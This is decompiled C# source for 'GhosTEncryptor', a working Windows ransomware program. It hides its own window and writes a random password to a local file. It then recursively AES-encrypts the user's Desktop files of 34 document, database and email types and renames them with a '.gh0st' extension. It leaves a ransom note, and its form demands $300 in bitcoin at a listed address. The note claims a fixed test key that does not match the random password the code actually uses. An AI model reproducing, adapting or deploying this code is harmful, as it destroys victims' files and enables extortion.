using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace GhosTEncryptor;

public class Form1 : Form
{
	private string userName = Environment.UserName;

	private string computerName = Environment.MachineName.ToString();

	private string userDir = "C:\\Users\\";

	private IContainer components;

	private Label label1;

	private Label label2;

	private Label label3;

	private Label label4;

	private Label label5;

	private Label label6;

	private TextBox textBox1;

	private Label label7;

	private Button button1;

	private Label label8;

	public Form1()
	{
		InitializeComponent();
	}

	private void textBox1_TextChanged(object sender, EventArgs e)
	{
	}

	private void button1_Click(object sender, EventArgs e)
	{
	}

	private void label8_Click(object sender, EventArgs e)
	{
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowInTaskbar(false);
		startAction();
	}

	public byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 8, 2, 4, 1, 3, 6, 0, 5 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	public string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	public void SendPassword(string password)
	{
		string value = computerName + "-" + userName + " " + password;
		string path = "C:\\Users\\Morris\\Desktop\\test.txt";
		if (File.Exists(path))
		{
			using (StreamWriter streamWriter = new StreamWriter(path, append: true))
			{
				streamWriter.WriteLine(value);
			}
		}
	}

	public void EncryptFile(string file, string password)
	{
		byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		bytes = SHA256.Create().ComputeHash(bytes);
		byte[] bytes2 = AES_Encrypt(bytesToBeEncrypted, bytes);
		File.WriteAllBytes(file, bytes2);
		File.Move(file, file + ".gh0st");
	}

	public void encryptDirectory(string location, string password)
	{
		string[] source = new string[34]
		{
			".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".csv", ".sql",
			".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd", ".dat", ".db",
			".dbf", ".log", ".mdb", ".sav", ".sql", ".tar", ".xml", ".email", ".eml", ".msg",
			".oft", ".ost", ".pst", ".vcf"
		};
		string[] files = Directory.GetFiles(location);
		string[] directories = Directory.GetDirectories(location);
		for (int i = 0; i < files.Length; i++)
		{
			string extension = Path.GetExtension(files[i]);
			if (source.Contains(extension))
			{
				EncryptFile(files[i], password);
			}
		}
		for (int j = 0; j < directories.Length; j++)
		{
			encryptDirectory(directories[j], password);
		}
	}

	public void startAction()
	{
		string password = CreatePassword(15);
		string text = "\\Desktop";
		string location = userDir + userName + text;
		SendPassword(password);
		encryptDirectory(location, password);
		messageCreator();
		password = null;
		Application.Exit();
	}

	public void messageCreator()
	{
		string text = "\\Desktop\\READ_ME.txt";
		string path = userDir + userName + text;
		string[] contents = new string[1] { "All your personal files have been encrypted with GhosTEncryptor. The only way to get your files back is to message us for decryptor, the decryptor is absolutely free. Also, this is ransomware was made for testing purposes, please note that it does encrypt files, but the key to decrypt them is 123456789." };
		File.WriteAllLines(path, contents);
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_00a3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ad: Expected O, but got Unknown
		//IL_0127: Unknown result type (might be due to invalid IL or missing references)
		//IL_0131: Expected O, but got Unknown
		//IL_01ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b5: Expected O, but got Unknown
		//IL_0232: Unknown result type (might be due to invalid IL or missing references)
		//IL_023c: Expected O, but got Unknown
		//IL_02b9: Unknown result type (might be due to invalid IL or missing references)
		//IL_02c3: Expected O, but got Unknown
		//IL_0350: Unknown result type (might be due to invalid IL or missing references)
		//IL_035a: Expected O, but got Unknown
		//IL_04dd: Unknown result type (might be due to invalid IL or missing references)
		//IL_04e7: Expected O, but got Unknown
		//IL_06df: Unknown result type (might be due to invalid IL or missing references)
		//IL_06e9: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		label1 = new Label();
		label2 = new Label();
		label3 = new Label();
		label4 = new Label();
		label5 = new Label();
		label6 = new Label();
		textBox1 = new TextBox();
		label7 = new Label();
		button1 = new Button();
		label8 = new Label();
		((Control)this).SuspendLayout();
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Font(new Font("Anonymous Pro", 20.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label1).set_Location(new Point(123, 25));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(588, 28));
		((Control)label1).set_TabIndex(0);
		((Control)label1).set_Text("Oops! It's not your lucky day today!");
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)238));
		((Control)label2).set_Location(new Point(29, 95));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(357, 20));
		((Control)label2).set_TabIndex(1);
		((Control)label2).set_Text("You've became a victim of GhosTEncryptor.");
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)238));
		((Control)label3).set_Location(new Point(28, 134));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(496, 20));
		((Control)label3).set_TabIndex(2);
		((Control)label3).set_Text("The only way to recover your files is to pay us 300$ in bitcoin!\r\n");
		((Control)label4).set_AutoSize(true);
		((Control)label4).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)238));
		((Control)label4).set_Location(new Point(29, 169));
		((Control)label4).set_Name("label4");
		((Control)label4).set_Size(new Size(682, 40));
		((Control)label4).set_TabIndex(3);
		((Control)label4).set_Text("Don't even waste your time on searching for a decryption tool.\r\nIt'll be useless, since the program uses AES-256 military grade encryption algorithm.");
		((Control)label5).set_AutoSize(true);
		((Control)label5).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)238));
		((Control)label5).set_ForeColor(SystemColors.Window);
		((Control)label5).set_Location(new Point(11, 327));
		((Control)label5).set_Name("label5");
		((Control)label5).set_Size(new Size(497, 20));
		((Control)label5).set_TabIndex(4);
		((Control)label5).set_Text("Bitcoin adress: VtFBPQC8GDE1EB3ubYc9URkTqhUntqQTat");
		((Control)label6).set_AutoSize(true);
		((Control)label6).set_Font(new Font("Microsoft Sans Serif", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)238));
		((Control)label6).set_Location(new Point(12, 386));
		((Control)label6).set_Name("label6");
		((Control)label6).set_Size(new Size(573, 45));
		((Control)label6).set_TabIndex(5);
		((Control)label6).set_Text(componentResourceManager.GetString("label6.Text"));
		((Control)textBox1).set_Location(new Point(208, 236));
		((Control)textBox1).set_Name("textBox1");
		((Control)textBox1).set_Size(new Size(377, 20));
		((Control)textBox1).set_TabIndex(6);
		((Control)textBox1).add_TextChanged((EventHandler)textBox1_TextChanged);
		((Control)label7).set_AutoSize(true);
		((Control)label7).set_Location(new Point(30, 239));
		((Control)label7).set_Name("label7");
		((Control)label7).set_Size(new Size(172, 13));
		((Control)label7).set_TabIndex(7);
		((Control)label7).set_Text("The key you got after the payment:");
		((ButtonBase)button1).get_FlatAppearance().set_MouseDownBackColor(Color.FromArgb(55, 55, 55));
		((ButtonBase)button1).get_FlatAppearance().set_MouseOverBackColor(Color.FromArgb(55, 55, 55));
		((ButtonBase)button1).set_FlatStyle((FlatStyle)0);
		((Control)button1).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)3, (GraphicsUnit)3, (byte)238));
		((Control)button1).set_Location(new Point(309, 262));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(176, 31));
		((Control)button1).set_TabIndex(10);
		((Control)button1).set_Text("Check payment");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)button1).add_Click((EventHandler)button1_Click);
		((Control)label8).set_AutoSize(true);
		((Control)label8).set_Location(new Point(600, 418));
		((Control)label8).set_Name("label8");
		((Control)label8).set_Size(new Size(38, 13));
		((Control)label8).set_TabIndex(11);
		((Control)label8).set_Text("Seed: ");
		((Control)label8).add_Click((EventHandler)label8_Click);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.FromArgb(192, 0, 0));
		((Form)this).set_ClientSize(new Size(839, 440));
		((Control)this).get_Controls().Add((Control)(object)label8);
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).get_Controls().Add((Control)(object)label7);
		((Control)this).get_Controls().Add((Control)(object)textBox1);
		((Control)this).get_Controls().Add((Control)(object)label6);
		((Control)this).get_Controls().Add((Control)(object)label5);
		((Control)this).get_Controls().Add((Control)(object)label4);
		((Control)this).get_Controls().Add((Control)(object)label3);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("GhosTEncryptor");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
